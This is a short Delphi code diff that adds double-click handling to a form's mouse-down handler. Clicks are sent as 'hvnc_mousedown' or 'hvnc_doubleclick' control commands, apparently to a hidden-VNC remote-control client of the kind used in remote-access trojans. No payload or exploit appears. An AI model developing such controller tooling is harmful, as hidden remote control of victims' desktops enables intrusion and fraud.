@@ -457,11 +457,18 @@ procedure TForm10.PaintBox1MouseDown(Sender: TObject; Button: TMouseButton;
   Shift: TShiftState; X, Y: Integer);
 var
   BtnIdx: Integer;
+  Action: string;
 begin
   BtnIdx := 0;
   if Button = mbRight  then BtnIdx := 1;
   if Button = mbMiddle then BtnIdx := 2;
-  SendControlCommand('hvnc_mousedown', X, Y, BtnIdx);
+
+  if ssDouble in Shift then
+    Action := 'hvnc_doubleclick'
+  else
+    Action := 'hvnc_mousedown';
+
+  SendControlCommand(Action, X, Y, BtnIdx);
 end;
 
 procedure TForm10.PaintBox1MouseMove(Sender: TObject; Shift: TShiftState;
